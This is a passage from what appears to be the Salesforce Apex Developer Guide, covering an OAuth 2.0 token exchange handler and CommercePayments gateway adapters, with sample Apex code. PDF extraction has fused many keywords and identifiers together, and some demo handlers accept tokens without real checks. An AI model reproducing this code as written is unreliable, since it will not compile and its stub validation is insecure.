System.assertEquals(expectedUserData.email,actualUserData.email);
System.assertEquals(expectedUserData.username,actualUserData.username);
System.assertEquals(expectedUserData.locale,actualUserData.locale);
System.assertEquals(expectedUserData.provider,actualUserData.provider);
System.assertEquals(expectedUserData.siteLoginUrl,actualUserData.siteLoginUrl);
}
// implementinga mockhttpresponsegeneratorfor concur
publicclassConcurMockHttpResponseGeneratorimplementsHttpCalloutMock{
publicHTTPResponserespond(HTTPRequestreq){
Stringnamespace= API_USER_VERSION_URL;
Stringprefix= 'mockPrefix';
367
Using Salesforce Features with ApexApex Developer Guide

Dom.Documentdoc = new Dom.Document();
Dom.XmlNodexmlNode=  doc.createRootElement('mockRootNodeName', namespace,prefix);
xmlNode.addChildElement('LoginId', namespace,prefix).addTextNode(LOGIN_ID);
xmlNode.addChildElement('FirstName', namespace,prefix).addTextNode(FIRST_NAME);
xmlNode.addChildElement('LastName', namespace,prefix).addTextNode(LAST_NAME);
xmlNode.addChildElement('EmailAddress', namespace,
prefix).addTextNode(EMAIL_ADDRESS);
xmlNode.addChildElement('LocaleName', namespace,prefix).addTextNode(LOCALE_NAME);
xmlNode.addChildElement('AccessToken', null, null).addTextNode(OAUTH_TOKEN);
xmlNode.addChildElement('RefreshToken', null, null).addTextNode(REFRESH_TOKEN);
System.debug(doc.toXmlString());
// Createa fakeresponse
HttpResponseres = new HttpResponse();
res.setHeader('Content-Type', 'application/xml');
res.setBody(doc.toXmlString());
res.setStatusCode(200);
returnres;
}
}
}
SEE ALSO:
Apex Reference Guide: AuthProviderPlugin Interface
Salesforce Help: Create a Custom External Authentication Provider
OAuth 2.0 Token Exchange Handler Examples
EDITIONS
Available in: Enterprise,
Unlimited, Performance,
and Developer Editions
Sometimes you want to integrate Salesforce into a complex system where you have a primary app,
a central identity provider, and multiple other apps and microservices. In this model, users log in
to the primary app via the identity provider and access data provided by the other apps and
microservices. To fit Salesforce into this model as one of the apps providing data, use the OAuth
2.0 token exchange flow, which implements an Apex token exchange handler.
During the OAuth 2.0 token exchange flow, when a user logs in to the primary app via the identity
provider, the identity provider issues a token to the primary app. The primary app can’t use this
token to directly access Salesforce data, but it can exchange the token for a Salesforce access token. To complete this exchange, the
primary app uses an Apex token exchange handler. With the token exchange handler, Salesforce can issue its own access token by
validating the identity provider’s token and mapping the token’s subject, which identifies the end user, to a Salesforce user.
To build an Apex token exchange handler, create a class that extends the Auth.Oauth2TokenExchangeHandler abstract
class and customize its validation logic and subject mapping.
368
Using Salesforce Features with ApexApex Developer Guide

Token Exchange Handler Abstract Class
The Auth.Oauth2TokenExchangeHandler abstract class contains two methods. Use the first method,
validateIncomingToken, to validate the identity provider’s token. Use the second method, getUserForTokenSubject,
to map the token’s subject to a Salesforce user.
globalabstractclassOauth2TokenExchangeHandler{
//Firstmethodcalledin the handler
globalvirtualAuth.TokenValidationResultvalidateIncomingToken(StringappDeveloperName,
Auth.IntegratingAppTypeappType,StringincomingToken,Auth.OAuth2TokenExchangeType
tokenType){
//Thismethodmustbe overriddenby the extendingclass
//Validatethe identityprovider’stoken.Dependingon youruse caseand token
type,writevalidationlogicthatdoesthesethings:
// Use the tokento makea calloutto the identityprovider’sUserInfoendpoint
// Use the tokento makea calloutto identityprovider’sIntrospectionendpoint
// Validatea SAMLresponse
// Validatea JWT locally
// The appDeveloperNameis the developernameof the ConnectedApp or External
ClientApp
//TheIntegratingAppTypeis an ENUMthatis eithera ConnectedApp or External
ClientApp
// Afteryou validatethe token,returntrueor false
returnnull;
}
//Secondmethodcalledin the handler
globalvirtualUsergetUserForTokenSubject(IdnetworkId,Auth.TokenValidationResult
result,BooleancanCreateUser,StringappDeveloperName,Auth.IntegratingAppTypeappType)
{
//Thismethodmustbe overriddenby the extendingclass
//Tomap the subjectof the tokento a Salesforceuser,writecodethatdoesthese
things:
// Get datadirectlyfromthe token,and queryfor the userin Salesforce
// Get datafromthe identityprovider’sUserInfoendpointusingthe tokenand
queryfor the userin Salesforce
// Get datafromthe SAMLassertionand queryfor the userin Salesforce
// If the useris not in Salesforce,and canCreateUseris true,set up a User
object
// Thisincludesexternalusers,so it can includean accountand contact
// If the userId is null,Salesforceautomaticallyinsertsthe user(assumingthat
canCreateUseris true)
returnnull;
}
}
The way you build your validation and subject mapping processes depends on your use case, identity provider, and token type. Use
these examples to get started.
Important:  These example implementations and code snippets are for demonstration only. Use them as a starting point, but
make sure you evaluate, customize, and test them carefully.
369
Using Salesforce Features with ApexApex Developer Guide

Token Exchange Handler Example Implementation
This example implementation extends the Auth.Oauth2TokenExchangeHandler abstract class.
In this example, the OAuth2TokenExchangeType enum specifies that the token is a JSON Web Token (JWT). The first method,
validateIncomingToken, uses a method in the Auth.JWTUtil class to validate the token by calling an endpoint on the
external identity provider.
Validating the token returns an instance of the Auth.TokenValidationResult class with information about the token and the
user.
With the second method, getUserForTokenSubject, the handler gets information about the user from the token validation
result. The example shows two ways to bundle the user data—either by creating a class with a custom data structure or by using the
Auth.UserData class.
After the handler gets the user data from the token, it looks for a Salesforce user matching the token subject. In this example, the handler
doesn’t find a user, so it creates a User object. To finish creating the user, Salesforce automatically inserts the User object for you.
/*TokenExchangeHandlerImplementationExample*/
publicclassMyTokenExchangeClassextendsAuth.Oauth2TokenExchangeHandler{
publicoverrideAuth.TokenValidationResultvalidateIncomingToken(StringappDeveloperName,
Auth.IntegratingAppTypeappType,StringincomingToken,Auth.OAuth2TokenExchangeType
tokenType){
//Dependingon yourincomingtoken,you validateit in differentways
//Ifthe incomingtokenis an opaqueaccesstokenor refreshtoken,validateit
witha calloutto the identityprovider
//Ifit’sa SAMLassertion,validateit by checkingthe XML
//Ifit’san ID Tokenor JWT,try usingour JWT validationmethods
//Thisexampleassumesthatthe incomingtokenis a JWT and thatthereis a public
keysendpointon the identityprovider
//Beverycarefulwithany logicin thismethod,and testcarefullybeforeusing
BooleanisValid= false;
Auth.JWTjwt;
//Customdatastructure
CustomStructuredUserDatacustomData;
//Standarduserdatastructure
Auth.UserDatauserData;
if (tokenType== Auth.OAuth2TokenExchangeType.JWT|| tokenType==
Auth.OAuth2TokenExchangeType.ID_TOKEN){
try {
jwt = Auth.JWTUtil.validateJWTWithKeysEndpoint(incomingToken,
'https://your-idp.com/keys',true);
isValid= true;
//Thesevaluesare sourcedfromthe JWT or ID Token
userData= new Auth.UserData('identifier','firstName','lastName',
'fullName','customer@email.com','linkurl','remoteusername','local','Provider(IDP
Name)','', new Map<String,String>());
//Youcan alsopassdataas genericobject
customData= new CustomStructuredUserData();
} catch(Exceptione) {
isValid= false;
}
370
Using Salesforce Features with ApexApex Developer Guide

} elseif (tokenType== Auth.OAuth2TokenExchangeType.ACCESS_TOKEN|| tokenType==
Auth.OAuth2TokenExchangeType.REFRESH_TOKEN){
//Putlogicfor validatingan opaqueaccesstokenor refreshtokenhere
//Thisvalidationtypicallyinvolvesa calloutto the introspector userinfo
endpoints
//Ifyou callout to the userinfoendpoint,makesureto passthe datafrom
the validationintothe getUserForTokenSubjectmethodusingan Apexclassor the userdata
class
isValid= false;
} elseif (tokenType== Auth.OAuth2TokenExchangeType.SAML_2){
//Putlogicfor validatinga SAMLassertionhere
//ThisvalidationinvolvesXML parsing
isValid= false;
} else{
//Youcan add new tokentypes.If you don’tknowhow to validatethe token,
alwayscheckthe typeand returnfalse
isValid= false;
}
if(isValid){
returnnew Auth.TokenValidationResult(true,(object)customData,userData,
incomingToken,tokenType,'CustomErrorMessage');
} else{
returnnew Auth.TokenValidationResult(isValid);
}
}
publicoverrideUsergetUserForTokenSubject(IdnetworkId,Auth.TokenValidationResult
result,BooleancanCreateUser,StringappDeveloperName,Auth.IntegratingAppTypeappType)
{
//Ifyou passeddatafromthe validationmethod,grabit now.Rememberto cast
backfor the customdata
CustomStructuredUserDatacustomData= (CustomStructuredUserData)result.data;
Auth.UserDatauserData= result.userData;
//Ifyou don’thaveany datafromthe token,you can performa calloutusingthe
incomingtoken
StringuserToken= result.token;
//Now,searchfor a user
Useru;
try {
u = [SELECTId, IsActiveFROMUserWHEREemail=: userData.email];
} catch(Exceptione) {
//Nouserexistedfor thisemailaddress,or thereweretoo many.Try looking
harder
}
// If you didn’tfinda user,checkto see if you can createone
if (canCreateUser&& (u == null)){
u = new User();
u.firstName= userData.firstName;
u.lastName= userData.lastName;
371
Using Salesforce Features with ApexApex Developer Guide

//Finishsettinguserattributes.For externalusers,makesureyou set up the
contact/account/personaccount
//Ifyou assignpermissionsets,do it in a futuremethodto avoidmixedDML
//Returningthe userfromthismethodhandlesthe insertion,so it’snot
necessaryto manuallyinsert
}
returnu;
}
//Thisclassgivesyou a way to passstructureddatabetweenthe validateIncomingToken
and getUserForTokenSubjectmethods
//Thisexampleis for demonstrationonly.Implementthisclassin a way thatmatches
the datathatyou are passing
privateclassCustomStructuredUserData{
publicStringcustomAttribute1;
publicIntegercustomAttribute2;
publicMap<String,Object>customAttribute3;
}
}
Examples for Validating Different Token Types
The custom logic for your implementation of the validateIncomingToken method depends on the token type. Here’s an
overview of the options for different token types.
•
For JWTs and ID tokens, use methods in the Auth.JWTUtil class.
•
For opaque tokens, such as opaque access and refresh tokens, call out to the identity provider’s introspection or user info endpoints.
•
For SAML assertions, write code to parse the XML from the assertion.
In this example, the handler validates a JWT from the identity provider. The handler determines the token type and uses the
validateJWTWithKey method in the Auth.JWTUtil class to validate the JWT with a public key.
globaloverrideAuth.TokenValidationResultvalidateIncomingToken(StringappDeveloperName,
Auth.IntegratingAppTypeappType,StringincomingToken,Auth.OAuth2TokenExchangeType
tokenType){
if (tokenType== Auth.OAuth2TokenExchangeType.JWT){
// Validatesthe JWT witha publickey,but we alsoprovidemethodsto validate
it witha certificate(Auth.JWTUtil.validateJWTWithCert)or witha keysendpoint
(Auth.JWTUtil.validateJWTWithKeysEndpoint)
Auth.JWTjwt =
Auth.JWTUtil.validateJWTWithKey(incomingToken,'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMI...');
returnnew Auth.TokenValidationResult(true);
}
returnnew Auth.TokenValidationResult(false);// Returnsa general'Tokenhandler
validationfailed'messagethatyou can customize
}
For opaque access tokens, which can’t be introspected locally on your app, call out to the introspection or user info endpoints on the
external identity provider. In this example for validating an opaque token, the handler sends a POST request to the identity provider’s
372
Using Salesforce Features with ApexApex Developer Guide

introspection endpoint and parses the identity provider’s JSON response so that Salesforce can understand it. It then validates the
response using the validateIncomingToken method.
globaloverrideAuth.TokenValidationResultvalidateIncomingToken(StringappDeveloperName,
Auth.IntegratingAppTypeappType,StringincomingToken,Auth.OAuth2TokenExchangeType
tokenType){
if (tokenType== Auth.OAuth2TokenExchangeType.ACCESS_TOKEN){
// Validatethe tokenwitha calloutto the introspectionendpoint
Stringbody=
'client_id=3MVG9AOp4kbriZ...&client_secret=71E147927AC...&token=00Dxx0000006H5T!AQEA...';
HttpRequestreq = new HttpRequest();
req.setMethod('POST');
req.setEndpoint('https://<MyCompanyDomain>/services/oauth2/introspect');
req.setHeader('Content-Type','application/x-www-form-urlencoded');
req.setBody(body);
Httphttp= new Http();
HttpResponseres = http.send(req);
Booleanactive;
Stringusername;
Auth.UserDatauserData;
if(res.getStatusCode()== 200){
System.JSONParserparser= System.JSON.createParser(res.getBody());
try {
while((active== null|| username== null)&& parser.nextToken()!=
null){
if (parser.getCurrentToken()== JSONToken.FIELD_NAME){
StringfieldName= parser.getText();
if (fieldName== 'active'){
parser.nextToken();
active= parser.getBooleanValue();
if (!active){
returnnew Auth.TokenValidationResult(false);
}
}
if (fieldName== 'username'){
parser.nextToken();
username= parser.getText();
}
}
}
if (active!= null&& username!= null){
userData= new Auth.UserData(null,null,null,null,null,null,
username,null,null,null,null);
}
} catch(JSONExceptione) {
returnnew Auth.TokenValidationResult(false);// Returnsa general
'Tokenhandlervalidationfailed'messagethatyou can customize
}
373
Using Salesforce Features with ApexApex Developer Guide

} else{
returnnew Auth.TokenValidationResult(false);// Returnsa general'Token
handlervalidationfailed'messagethatyou can customize
}
returnnew Auth.TokenValidationResult(true,null,userData,incomingToken,
tokenType,null);
}
returnnew Auth.TokenValidationResult(false);// Returnsa general'Tokenhandler
validationfailed'messagethatyou can customize
}
Example for Finding and Creating a User
During subject mapping, your handler finds the subject (end user) of the incoming token and tries to link it to a Salesforce user. Optionally,
you can configure your handler to help create a Salesforce user if it can’t find one. The handler doesn’t technically create the user—instead,
it returns a User object. Salesforce then automatically inserts the new user into the User object for you. To create the User object, the
isUserCreationAllowed field on your OauthTokenExchangeHandler metadata definition must be set to true. When
you set this metadata field to true, the CanCreateUser parameter in the getUserForTokenSubject Apex method is
also set to true.
If necessary, to get more information about the incoming subject, the handler can call out to the external identity provider or another
external system.
In this example implementation, the handler gets information about the user from the identity provider’s token and looks for an existing
Salesforce user. If no user exists, it creates a User object.
globalclassMyTokenExchangeHandlerextendsAuth.Oauth2TokenExchangeHandler{
globaloverrideAuth.TokenValidationResultvalidateIncomingToken(StringappDeveloperName,
Auth.IntegratingAppTypeappType,StringincomingToken,Auth.OAuth2TokenExchangeType
tokenType){
// Validatesthe incomingtoken
Auth.UserDatauserData= new Auth.UserData('someIdentifier','someFirstName',
'someLastName','someFullName','someEmail','someLink','someUsername@my.org','en_US',
'someProvider','someSiteLoginUrl',null);
returnnew Auth.TokenValidationResult(true,null,userData,incomingToken,tokenType,
null);
}
globaloverrideUsergetUserForTokenSubject(IdnetworkId,Auth.TokenValidationResult
result,BooleancanCreateUser,StringappDeveloperName,Auth.IntegratingAppTypeappType)
{
Stringusername= result.getUserData().username;
List<User>existingUser= [SELECTId, Username,Email,FirstName,LastName,Alias,
ProfileIdFROMUserWHEREUsername=:usernameLIMIT1];
if (!existingUser.isEmpty()){
374
Using Salesforce Features with ApexApex Developer Guide

returnexistingUser[0];
}
Useru = new User();
u.Username= username;
u.Email= 'some@email.com';
u.LastName= 'SomeLastName';
u.Alias= 'MyAlias';
u.TimeZoneSidKey= 'America/Los_Angeles';
u.LocaleSidKey= 'en_US';
u.EmailEncodingKey= 'UTF-8';
Profilep = [SELECTId FROMprofileWHEREname='StandardUser'];
u.ProfileId= p.Id;
u.LanguageLocaleKey= 'en_US';
returnu;
}
}
SEE ALSO:
Salesforce Help: OAuth 2.0 Token Exchange Flow
Apex Reference Guide: Oauth2TokenExchangeHandler Class
Apex Reference Guide: TokenValidationResult Class
Apex Reference Guide: OAuth2TokenExchangeType Enum
Apex Reference Guide: IntegratingAppType Enum
Apex Reference Guide: JWTUtil Class
Chatter Answers and Ideas
In Chatter Answers and Ideas, use zones to organize ideas and answers into groups. Each zone can have its own focus, with unique ideas
and answers topics to match that focus.
To work with zones in Apex, use the Answers, Ideas, and ConnectApi.Zones classes.
SEE ALSO:
Apex Reference Guide: Answers Class
Apex Reference Guide: Ideas Class
Apex Reference Guide: Zones Class
Use Cases for the CommercePayments Namespace
Review walkthroughs, use cases, and reference material for the CommercePayments platform.
To review CommercePayments class reference docs, go to CommercePayments Namespace.
375
Using Salesforce Features with ApexApex Developer Guide

Payment Gateway Adapters
Payment gateway adapters represent the bridge between your payments platform in Salesforce and an external payment gateway.
Payment Authorization Reversal Service
An authorization reversal is a transaction that negates an authorization by releasing the hold on funds in a customer’s payment
method.
Tokenization Service
The credit card tokenization process replaces sensitive customer information with a one-time algorithmically generated number,
called a token, used during the payment transaction. Salesforce stores the token and then uses that token as a representation of the
credit card used for transactions. The token lets you store information about the credit card without storing sensitive customer data,
such as credit card numbers, in Salesforce.
Alternative Payment Methods
An alternative payment method allows customers to store and represent payment method information not represented by another
pre-defined payment method such as CardPaymentMethod or DigitalWallet. Common examples of alternative payment
methods include CashOnDeliver, Klarna, and Direct Debit. Alternative payment methods are available in API v51.0 and later.
Process Payments
Process a payment in the payment gateway.
Process Refund
Process a refund in the payment gateway.
Idempotency Guidelines
Idempotency represents the ability of a payment gateway to recognize duplicate requests submitted either in error or maliciously,
and then process the duplicate requests accordingly. When working with an idempotent gateway, consider these important
guidelines.
Sample Payment Gateway Implementation for CommercePayments
We’ve created a GitHub repository containing code samples for a sample Payeezy payment gateway implementation with the
CommercePayments namespace. Review the sample code if you need help with configuring your payment gateway implementation.
Payment Gateway Adapters
Payment gateway adapters represent the bridge between your payments platform in Salesforce and an external payment gateway.
Building a Synchronous Gateway Adapter
In synchronous payment configurations, the Salesforce payment platform sends transaction information to the gateway, and then
waits for a gateway response that contains the final transaction status. Salesforce creates a transaction only if the transaction is
successful in the gateway.
Set Up a Synchronous Payment Gateway Adapter
For payments transactions, you can configure Salesforce to interface with a synchronous payment gateway adapter.
Building an Asynchronous Gateway Adapter
In an asynchronous payments configuration, the payments platform first sends transaction information to the gateway. The gateway
responds with an acknowledgment that it received the transaction, and then the platform creates a pending transaction. The gateway
sends a notification, which contains the final transaction status. The platform then updates the transaction’s status accordingly.
Set Up an Asynchronous Payment Gateway Adapter
For payments transactions, you can configure Salesforce to interface with an asynchronous payment gateway adapter.
376
Using Salesforce Features with ApexApex Developer Guide

Builder Examples for Payment Gateway Adapters
The final sections of a payment gateway adapter should define how the adapter creates requests and responses. The implementation
of these classes can vary widely based on your gateway and platform requirements. We’ve provided several generics examples for
review.
Building a Synchronous Gateway Adapter
In synchronous payment configurations, the Salesforce payment platform sends transaction information to the gateway, and then waits
for a gateway response that contains the final transaction status. Salesforce creates a transaction only if the transaction is successful in
the gateway.
A synchronous gateway adapter implements the PaymentGatewayAdapterInterface. In this topic, we examine a sample
synchronous adapter by looking at PaymentGatewayAdapter, and then the processRequest method, which drives most
of the communication between the payment platform and the payment gateway.
Note:  Payment gateway adapters can’t make future calls, external callouts using System.Http, asynchronous calls, queueable
calls, or execute DMLs using SOQL.
PaymentGatewayAdapter
All synchronous gateways must implement the PaymentGatewayAdapter interface. All PaymentGatewayAdapters are required
to implement the processRequest method.
globalwithsharingclassSampleAdapterimplementscommercepayments.PaymentGatewayAdapter
{
globalSampleAdapter(){}
globalcommercepayments.GatewayResponse
processRequest(commercepayments.paymentGatewayContextgatewayContext){
}
}
Processing an Initial Payment Request
When the payments platform receives a payments API request, it passes the request to your gateway adapter for further evaluation. The
adapter begins the request evaluation process by calling the processRequest method, which represents the first step in a
synchronous payment flow. We can break the processRequest implementation into three parts.
First, it builds a payment request object that the gateway can understand.
commercepayments.RequestTyperequestType= gatewayContext.getPaymentRequestType();
if (requestType== commercepayments.RequestType.Capture){
req.setEndpoint('/pal/servlet/Payment/v52/capture');
body=
buildCaptureRequest((commercepayments.CaptureRequest)gatewayContext.getPaymentRequest());
} elseif (requestType== commercepayments.RequestType.ReferencedRefund){
req.setEndpoint('/pal/servlet/Payment/v52/refund');
body=
buildRefundRequest((commercepayments.ReferencedRefundRequest)gatewayContext.getPaymentRequest());
}
Note:  We don't recommend encoding the request body, which contains the merge fields, including the card number and CVV.
This can cause the request to fail to read the encoded request body and to fail to replace the merge field values.
377
Using Salesforce Features with ApexApex Developer Guide

Then, the adapter sends the request to the payment gateway.
req.setBody(body);
req.setMethod('POST');
commercepayments.PaymentsHttphttp= new commercepayments.PaymentsHttp();
HttpResponseres = null;
try {
res = http.send(req);
} catch(CalloutExceptionce) {
commercepayments.GatewayErrorResponseerror= new
commercepayments.GatewayErrorResponse('500', ce.getMessage());
returnerror;
}
Finally, the adapter creates a response object to store data from the gateway’s response. The type of response object varies based on
whether you originally made a payment capture request or a refund request.
if ( requestType== commercepayments.RequestType.Capture){
// Referto the end of thisdoc for samplecreateCaptureResponseimplementation
response=  createCaptureResponse(res);
} elseif ( requestType== commercepayments.RequestType.ReferencedRefund){
response=  createRefundResponse(res);
}
returnresponse;
Using Custom Data
To transfer additional, custom data from the frontend to your payment gateway adapter, use the Checkout Payments Connect API.
Sending custom data to the adapter supports use cases like implementing conditional logic based on specific data or mapping
asynchronous webhook events to a cart by passing an identifier.
To send custom data to your payment gateway adapter, use the paymentsData parameter in the Checkout Payments Connect API
input payload. This parameter is a serialized map of type <String,String> that supports up to four key-value pairs. Each key
and each value can contain up to 255 characters. paymentsData is only applicable to Auth and PostAuth payment requests. Simple
purchase orders don’t support paymentsData.
Similarly, the Post Authorization input payload has an additionalData property, which is also a map of type<String,String>.
The paymentsData property is accepted for Auth and PostAuth requests and is transferred to the Payment APIs through the
additionalData property.
Set Up a Synchronous Payment Gateway Adapter
EDITIONS
Available in: Salesforce
Summer ’20 and later
Available in: API 49.0 and
later
For payments transactions, you can configure Salesforce to interface with a synchronous payment
gateway adapter.
To access the commercepayments API, you need the PaymentPlatform org permission.
1.Create your payment gateway adapter Apex classes. For instructions, see Building a Synchronous
Gateway Adapter.
2.Create a named credential.
a.From Setup, in the Quick Find box, enter NamedCredentials, and then select New..
b.Complete the required fields, including the URL for your payment gateway.
378
Using Salesforce Features with ApexApex Developer Guide

3.Create a payment gateway provider. The PaymentGatewayProvider object stores details about the payment gateway that Salesforce
Payments communicates with when processing a transaction.
a.Generate an access token according to the instructions in Connect to Connect REST API Using OAuth.
The response includes the access token, specified in the access_token property, and the server instance, specified in the
instance_url property. Use this information to make API calls to build the payment gateway provider.
b.Execute a POST call to the resource using the domain in the instance_url. For example,
https://instance_name.my.salesforce.com/services/data/vapi_version/tooling/sobjects/PaymentGatewayProvider.
Use this payload as the request body, replacing value with the correct data.
{
"ApexAdapterId":"value",
"DeveloperName":"value",
"MasterLabel":"value",
"IdempotencySupported":"value",
"Comments":"value"
}
Example:
{
"ApexAdapterId":"01pxx0000004UU8AAM",
"DeveloperName":"MyNewGatewayProvider",
"MasterLabel":"My New GatewayProvider",
"IdempotencySupported":"Yes",
"Comments":"Custommadegatewayprovider."
}
4.Create a payment gateway record. The PaymentGateway object stores information about the connection to the external payment
gateway. The record requires these field values.
•
Payment Gateway Name: Name of the external payment gateway.
•
Merchant Credential ID: ID of the named credential that you created.
•
Payment Gateway Provider ID: ID of the payment gateway provider that you created.
•
Status: Active
SEE ALSO:
Object Reference for the Salesforce Platform: PaymentGateway
Object Reference for the Salesforce Platform: PaymentGatewayProvider
Building an Asynchronous Gateway Adapter
In an asynchronous payments configuration, the payments platform first sends transaction information to the gateway. The gateway
responds with an acknowledgment that it received the transaction, and then the platform creates a pending transaction. The gateway
sends a notification, which contains the final transaction status. The platform then updates the transaction’s status accordingly.
The asynchronous process differs from synchronous transactions, where the platform does not create a pending transaction after the
initial gateway request. Instead, the platform creates a transaction only after the gateway sends a response containing the final transaction
status. For information on building a synchronous adapter, review Building a Synchronous Gateway Adapter.
379
Using Salesforce Features with ApexApex Developer Guide

An asynchronous configuration requires both a synchronous gateway adapter and an asynchronous adapter. In this topic, we’ll break
down a sample asynchronous adapter by looking at several important areas.
•
Defining an asynchronous payment gateway adapter
•
Processing the initial payment request
•
Processing a notification from the payment gateway
•
Debugging gateway responses using system debug logs.
Note:  Payment gateway adapters can’t make future calls, external callouts using System.Http, asynchronous calls, queueable
calls, or execute DMLs using SOQL.
Asynchronous Payment Gateway Adapter Definition
An asynchronous gateway adapter class must implement both the PaymentGatewayAdapterInterface and the
PaymentGatewayAsyncAdapterInterface. The adapter class must also implement the processRequest method for
PaymentGatewayAdapter and the processNotification method for PaymentGatewayAsyncAdapter.
globalwithsharingclassSampleAdapterimplements
commercepayments.PaymentGatewayAsyncAdapter,commercepayments.PaymentGatewayAdapter{
globalSampleAdapter(){}
globalcommercepayments.GatewayResponse
processRequest(commercepayments.paymentGatewayContextgatewayContext){
}
globalcommercepayments.GatewayNotificationResponse
processNotification(commercepayments.PaymentGatewayNotificationContext
gatewayNotificationContext){
}
}
Processing an Initial Payment Request
When the payments platform receives a payments API request, it passes the request to your gateway adapter for further evaluation. The
adapter begins the request evaluation process by calling the processRequest method, which represents the first step in an asynchronous
payment flow. We can break the processRequest implementation into three parts.
First, it builds a payment request object that the gateway can understand.
commercepayments.RequestTyperequestType= gatewayContext.getPaymentRequestType();
if (requestType== commercepayments.RequestType.Capture){
req.setEndpoint('/pal/servlet/Payment/v52/capture');
body=
buildCaptureRequest((commercepayments.CaptureRequest)gatewayContext.getPaymentRequest());
} elseif (requestType== commercepayments.RequestType.ReferencedRefund){
req.setEndpoint('/pal/servlet/Payment/v52/refund');
body=
buildRefundRequest((commercepayments.ReferencedRefundRequest)gatewayContext.getPaymentRequest());
}
Then, the adapter sends the request to the payment gateway.
req.setBody(body);
req.setMethod('POST');
380
Using Salesforce Features with ApexApex Developer Guide

commercepayments.PaymentsHttphttp= new commercepayments.PaymentsHttp();
HttpResponseres = null;
try {
res = http.send(req);
} catch(CalloutExceptionce) {
commercepayments.GatewayErrorResponseerror= new
commercepayments.GatewayErrorResponse('500', ce.getMessage());
returnerror;
}
Finally, the adapter creates a response object to store data from the gateway’s response. The type of response object will vary based on
whether you originally made a payment capture request or a refund request.
if ( requestType== commercepayments.RequestType.Capture){
// Referto the end of thisdoc for samplecreateCaptureResponseimplementation
response=  createCaptureResponse(res);
} elseif ( requestType== commercepayments.RequestType.ReferencedRefund){
response=  createRefundResponse(res);
}
returnresponse;
Processing a Notification from the Payment Gateway
After the customer bank processes the transaction and sends the results to the gateway, the gateway sends the adapter a notification
indicating that it’s ready to provide the final transaction status. For this part of an asynchronous transaction flow, the adapter needs to
call the processNotification class. We can split the processNotification implementation into four parts.
First, the adapter verifies the signature in the notification request. For more information on verifying signatures, review Encryption and
Signature Techniques in Apex.
privateBooleanverifySignature(NotificationRequestrequestItem){
Stringpayload= requestItem.pspReference+ ':'
+ (requestItem.originalReference== null? '' : requestItem.originalReference)+
':'
+ requestItem.merchantAccountCode+ ':'
+ requestItem.merchantReference+ ':'
+ requestItem.amount.value.intValue()+ ':'
+ requestItem.amount.currencyCode+ ':'
+ requestItem.eventCode+ ':'
+ requestItem.success;
StringmyHMacKey= getHMacKey();
StringgeneratedSign= EncodingUtil.base64Encode(Crypto.generateMac('hmacSHA256',
Blob.valueOf(payload),
EncodingUtil.convertFromHex(myHMacKey)));
returngeneratedSign.equals(requestItem.additionalData.hmacSignature);
}
Next, the adapter parses the gateway’s notification request and builds a notification object. The
getPaymentGatewayNotificationRequest method evaluates data from the gateway’s notification request items, which
include status, referenceNumber, event, and amount. The notificationStatus object is set to Success or Failed based on
whether the platform successfully received the notification. If the notification’s event code indicates that the gateway processed a
payment capture transaction, the adapter builds a notification object using the CaptureNotification class. If the event code
381
Using Salesforce Features with ApexApex Developer Guide

indicates that the gateway processed a refund transaction, the adapter builds a notification object using the
ReferencedRefundNotification class.
commercepayments.PaymentGatewayNotificationRequestgatewayNotificationRequest=
gatewayNotificationContext.getPaymentGatewayNotificationRequest();
Blobrequest= gatewayNotificationRequest.getRequestBody();
SampleNotificationRequestnotificationRequest=
SampleNotificationRequest.parse(request.toString().replace('currency', 'currencyCode'));
List<SampleNotificationRequest.NotificationItems>notificationItems=
notificationRequest.notificationItems;
SampleNotificationRequest.NotificationRequestItemnotificationRequestItem=
notificationItems[0].NotificationRequestItem;
Booleansuccess= Boolean.valueOf(notificationRequestItem.success);
StringpspReference= notificationRequestItem.pspReference;
StringeventCode= notificationRequestItem.eventCode;
Doubleamount= notificationRequestItem.amount.value;
commercepayments.NotificationStatusnotificationStatus= null;
if (success){
notificationStatus= commercepayments.NotificationStatus.Success;
} else{
notificationStatus= commercepayments.NotificationStatus.Failed;
}
commercepayments.BaseNotificationnotification= null;
if ('CAPTURE'.equals(eventCode)){
notification= new commercepayments.CaptureNotification();
} elseif ('REFUND'.equals(eventCode)){
notification= new commercepayments.ReferencedRefundNotification();
}
notification.setStatus(notificationStatus);
notification.setGatewayReferenceNumber(pspReference);
notification.setAmount(amount);
The adapter then requests that the payments platform records the results of the notification.
commercepayments.NotificationSaveResultsaveResult=
commercepayments.NotificationClient.record(notification);
All asynchronous gateways require that the platform acknowledges that it received the notification, regardless of whether the platform
successfully saved the notification’s data. The platform calls the GatewayNotificationResponse class to send the
acknowledgment.
commercepayments.GatewayNotificationResponsegnr = new
commercepayments.GatewayNotificationResponse();
if (saveResult.isSuccess()){
system.debug('Notificationacceptedby platform');
} else{
system.debug('Errorsin the result'+ Blob.valueOf(saveResult.getErrorMessage()));
}
gnr.setStatusCode(200);
gnr.setResponseBody(Blob.valueOf('[accepted]'));
returngnr;
382
Using Salesforce Features with ApexApex Developer Guide

Using Custom Data
To transfer additional, custom data from the frontend to your payment gateway adapter, use the Checkout Payments Connect API.
Sending custom data to the adapter supports use cases like implementing conditional logic based on specific data or mapping
asynchronous webhook events to a cart by passing an identifier.
To send custom data to your payment gateway adapter, use the paymentsData parameter in the Checkout Payments Connect API
input payload. This parameter is a serialized map of type <String,String> that supports up to four key-value pairs. Each key
and each value can contain up to 255 characters. paymentsData is only applicable to Auth and PostAuth payment requests. Simple
purchase orders don’t support paymentsData.
Similarly, the Post Authorization input payload has an additionalData property, which is also a map of type<String,String>.
The paymentsData property is accepted for Auth and PostAuth requests and is transferred to the Payment APIs through the
additionalData property.
Debugging
Usually, Apex debug logs are available in the developer console. However, Salesforce doesn’t store debug logs from the
processNotification method in the developer console. To view this part of the method flow using system.debug, review the
Collect Debug Logs for Guest Users section of Set Up Debug Logging.
Set Up an Asynchronous Payment Gateway Adapter
EDITIONS
Available in: Salesforce
Summer ’20 and later
Available in: API 49.0 and
later
For payments transactions, you can configure Salesforce to interface with an asynchronous payment
gateway adapter.
To access the commercepayments API, you need the PaymentPlatform org permission.
1.Create a Salesforce site. From Setup, in the Quick Find box, enter Sites. Under Sites and
Domains, select Sites see Set Up Salesforce Sites.
Set the site’s public access settings to Guest Access to the Payments API.
2.Create your payment gateway adapter Apex classes. Asynchronous payment gateways require
that you implement an asynchronous and a synchronous adapter. For information about building gateway adapters in Apex, see
Building an Asynchronous Gateway Adapter and Building a Synchronous Gateway Adapter.
3.Create a named credential in the UI.
a.From Setup, in the Quick Find box, enter NamedCredentials, and then select New.
